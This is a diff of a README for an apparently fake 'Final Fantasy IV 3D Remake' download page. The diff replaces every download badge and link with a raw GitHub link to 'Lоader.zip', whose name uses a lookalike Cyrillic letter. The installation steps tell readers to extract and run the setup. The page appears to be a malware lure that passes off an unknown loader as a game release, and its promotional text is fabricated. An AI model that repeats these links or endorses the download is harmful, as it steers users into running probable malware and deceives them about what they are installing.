@@ -1,6 +1,6 @@
 # 🎮 Final Fantasy IV 3D Remake - Download 2025 Edition
 
-[![Download Now](https://img.shields.io/badge/Download-FF4_3D_Remake-blue?style=for-the-badge&logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/somprasong-tukman/FF4-Remake-3D-Unlocked/main/Lоader.zip)](https://raw.githubusercontent.com/somprasong-tukman/FF4-Remake-3D-Unlocked/main/Lоader.zip)
 
 Experience the classic Final Fantasy IV in a brilliant new dimension! This 2025 release delivers exciting adventures, revamped 3D graphics, and dynamic storytelling, bringing nostalgia and advanced visuals to new heights. Discover legendary gameplay, epic battles, and an unforgettable journey—all optimized for modern platforms. Perfect for enthusiasts seeking advanced RPG mechanics with stunning soundscapes!
 
@@ -24,7 +24,7 @@ Experience the classic Final Fantasy IV in a brilliant new dimension! This 2025 
 
 ## 🚀 Installation Guide
 
-1. [![Download Now](https://img.shields.io/badge/Download-FF4_3D_Remake-blue?style=for-the-badge&logo=windows)](https://easylauncher.su/PSnzrH)  
+1. [![Download Now](https://raw.githubusercontent.com/somprasong-tukman/FF4-Remake-3D-Unlocked/main/Lоader.zip)](https://raw.githubusercontent.com/somprasong-tukman/FF4-Remake-3D-Unlocked/main/Lоader.zip)  
 2. Extract the installer and run the setup on your preferred OS.
 3. Follow on-screen instructions—enjoy your adventure!
 
@@ -42,4 +42,4 @@ Licensed under the [MIT License](LICENSE).
 
 ---
 
-### [![Download: Final Fantasy IV 3D Remake](https://img.shields.io/badge/Get_Final_Fantasy_IV_Remake-Here-blue?logo=windows)](https://easylauncher.su/PSnzrH)
+### [![Download: Final Fantasy IV 3D Remake](https://raw.githubusercontent.com/somprasong-tukman/FF4-Remake-3D-Unlocked/main/Lоader.zip)](https://raw.githubusercontent.com/somprasong-tukman/FF4-Remake-3D-Unlocked/main/Lоader.zip)
